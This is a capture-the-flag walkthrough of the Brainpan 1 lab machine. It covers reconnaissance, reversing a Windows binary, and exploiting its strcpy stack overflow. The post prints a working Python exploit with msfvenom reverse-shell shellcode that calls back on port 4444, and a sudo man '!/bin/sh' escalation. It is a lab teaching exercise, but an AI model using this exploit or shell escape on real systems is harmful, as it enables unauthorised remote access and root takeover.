---

title: "Brainpan 1"  
date: "2025-4-15"  
thumbnail: "/assets/img/thumbnail/Brainpan1.png"

---

# Brainpan 1
---
**Challenges Difficulty: Hard**  
**Category: Revers**

## Walkthrough 

---
Stating with nmap to scan the machine we found a service called abyss on port 9999 a web server running on port 10000
![image.png](/assets/img/posts/Brainpan1/image%2012.png)
Opening it returns a page that has nothing interested 
![image.png](/assets/img/posts/Brainpan1/image%2013.png)
let's use dirb to discover directories 

![image.png](/assets/img/posts/Brainpan1/image%2014.png)
opening /bin we found an .exe file called Brainpan.exe lets try to download it

![image.png](/assets/img/posts/Brainpan1/image%2015.png)
let's reverse this file using Ghidra  

![image.png](/assets/img/posts/Brainpan1/image%2016.png)
so this is the one running on port 9999

![image.png](/assets/img/posts/Brainpan1/image%2017.png)
and this program takes one input from the user and returns **ACCESS DENIED** or **ACCESS GRANTED**
![image.png](/assets/img/posts/Brainpan1/image%2018.png)
Friendly advice don't waste yore time to get the correct password as its actually just a printed string
but as i have wasted my time :) so any string that starts with **s** will return **ACCESS GRANTED**
![alt text](/assets/img/posts/Brainpan1/access.png)
actually this is the vulnerable part of the code as strcpy does not check bounds. so If input is longer than 520 bytes, it will overflow local_20c
![image.png](/assets/img/posts/Brainpan1/image%2021.png)
now we want to run this exe inside a debugger to cause a BO and get the address that would be in the eip to start our exploit i will use Immunity Debugger to do so
![image.png](/assets/img/posts/Brainpan1/image%2019.png)
created a pattern using msf-pattern_create to find the exact offset
![image.png](/assets/img/posts/Brainpan1/image%2020.png)

After a looooooooooong time i realized that ncat has a max buffer size of 511 🙂 

let’s use python

```bash
import socket

# Target details
TARGET_IP = "127.0.0.1"
TARGET_PORT = 9999

# Payload (1000 'A' characters)
payload = "A" * 1000  

# Create a TCP socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    # Connect to the target
    s.connect((TARGET_IP, TARGET_PORT))
    print("[+] Connected to the target")

    # Receive banner (if any)
    response = s.recv(1024)
    print("[+] Received:", response.decode(errors="ignore"))

    # Send the payload
    s.sendall(payload.encode())
    print("[+] Sent 1000 bytes")

    # Receive response (if any)
    response = s.recv(1024)
    print("[+] Server response:", response.decode(errors="ignore"))

except Exception as e:
    print("[!] Connection failed:", str(e))

finally:
    s.close()
    print("[+] Connection closed")

```

and finaly it’s a crash

![image.png](/assets/img/posts/Brainpan1/image%2022.png)

![image.png](/assets/img/posts/Brainpan1/image%2023.png)

![image.png](/assets/img/posts/Brainpan1/image%2024.png)
As we successful caused a BO we will use mona script inside Immunity Debugger to find a jmp esp instruction address  

![image.png](/assets/img/posts/Brainpan1/image%2025.png)
created a reverse shell using msfvenom to connect to my local ip throw port 4444 and modified the script

```python
import socket
import struct
# Target details
TARGET_IP = "127.0.0.1"
TARGET_PORT = 9999

# Payload (1000 'A' characters)
offset = b"A"*524 
eip= b'\xf3\x12\x17\x31'       #311712F3  
buf =  b""
buf += b"\xd9\xc1\xba\x43\xbc\xeb\x48\xd9\x74\x24\xf4\x5d"
buf += b"\x31\xc9\xb1\x52\x31\x55\x17\x03\x55\x17\x83\x86"
buf += b"\xb8\x09\xbd\xf4\x29\x4f\x3e\x04\xaa\x30\xb6\xe1"
buf += b"\x9b\x70\xac\x62\x8b\x40\xa6\x26\x20\x2a\xea\xd2"
buf += b"\xb3\x5e\x23\xd5\x74\xd4\x15\xd8\x85\x45\x65\x7b"
buf += b"\x06\x94\xba\x5b\x37\x57\xcf\x9a\x70\x8a\x22\xce"
buf += b"\x29\xc0\x91\xfe\x5e\x9c\x29\x75\x2c\x30\x2a\x6a"
buf += b"\xe5\x33\x1b\x3d\x7d\x6a\xbb\xbc\x52\x06\xf2\xa6"
buf += b"\xb7\x23\x4c\x5d\x03\xdf\x4f\xb7\x5d\x20\xe3\xf6"
buf += b"\x51\xd3\xfd\x3f\x55\x0c\x88\x49\xa5\xb1\x8b\x8e"
buf += b"\xd7\x6d\x19\x14\x7f\xe5\xb9\xf0\x81\x2a\x5f\x73"
buf += b"\x8d\x87\x2b\xdb\x92\x16\xff\x50\xae\x93\xfe\xb6"
buf += b"\x26\xe7\x24\x12\x62\xb3\x45\x03\xce\x12\x79\x53"
buf += b"\xb1\xcb\xdf\x18\x5c\x1f\x52\x43\x09\xec\x5f\x7b"
buf += b"\xc9\x7a\xd7\x08\xfb\x25\x43\x86\xb7\xae\x4d\x51"
buf += b"\xb7\x84\x2a\xcd\x46\x27\x4b\xc4\x8c\x73\x1b\x7e"
buf += b"\x24\xfc\xf0\x7e\xc9\x29\x56\x2e\x65\x82\x17\x9e"
buf += b"\xc5\x72\xf0\xf4\xc9\xad\xe0\xf7\x03\xc6\x8b\x02"
buf += b"\xc4\x96\x4b\x0c\x15\x01\x4e\x0c\x04\x8d\xc7\xea"
buf += b"\x4c\x3d\x8e\xa5\xf8\xa4\x8b\x3d\x98\x29\x06\x38"
buf += b"\x9a\xa2\xa5\xbd\x55\x43\xc3\xad\x02\xa3\x9e\x8f"
buf += b"\x85\xbc\x34\xa7\x4a\x2e\xd3\x37\x04\x53\x4c\x60"
buf += b"\x41\xa5\x85\xe4\x7f\x9c\x3f\x1a\x82\x78\x07\x9e"
buf += b"\x59\xb9\x86\x1f\x2f\x85\xac\x0f\xe9\x06\xe9\x7b"
buf += b"\xa5\x50\xa7\xd5\x03\x0b\x09\x8f\xdd\xe0\xc3\x47"
buf += b"\x9b\xca\xd3\x11\xa4\x06\xa2\xfd\x15\xff\xf3\x02"
buf += b"\x99\x97\xf3\x7b\xc7\x07\xfb\x56\x43\x27\x1e\x72"
buf += b"\xbe\xc0\x87\x17\x03\x8d\x37\xc2\x40\xa8\xbb\xe6"
buf += b"\x38\x4f\xa3\x83\x3d\x0b\x63\x78\x4c\x04\x06\x7e"
buf += b"\xe3\x25\x03"
nop=b'\x90'*50
eof=b"\xCC"
payload= offset+eip+nop+buf+nop+eof
# Create a TCP socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the target
s.connect((TARGET_IP, TARGET_PORT))
print("[+] Connected to the target")

# Receive banner (if any)
response = s.recv(1024)

# Send the payload
s.sendall(payload)
print("[+] Sent 1000 bytes")
```

![image.png](/assets/img/posts/Brainpan1/image%2026.png)
and this worked correctly and got a reverse shell now we want to send it to the actual server **remember to recreate the reverse shell with your ip**

![image.png](/assets/img/posts/Brainpan1/image%2027.png)
and we got a shell but it seems that we are inside Sandbox/Evasion Environment 

![image.png](/assets/img/posts/Brainpan1/image%2028.png)

![image.png](/assets/img/posts/Brainpan1/image%2029.png)
now we know that we can run /home/anansi/bin/anansi_util with sudo 
![image.png](/assets/img/posts/Brainpan1/image%2030.png)
this bin gives us 3 commands that we can run
1. network
2. proclist
3. manual 

from [gtfobins](https://gtfobins.github.io/gtfobins/man/#sudo) we know that we can get a shell from man using
```bash
!/bin/sh
```
![image.png](/assets/img/posts/Brainpan1/bin.png)



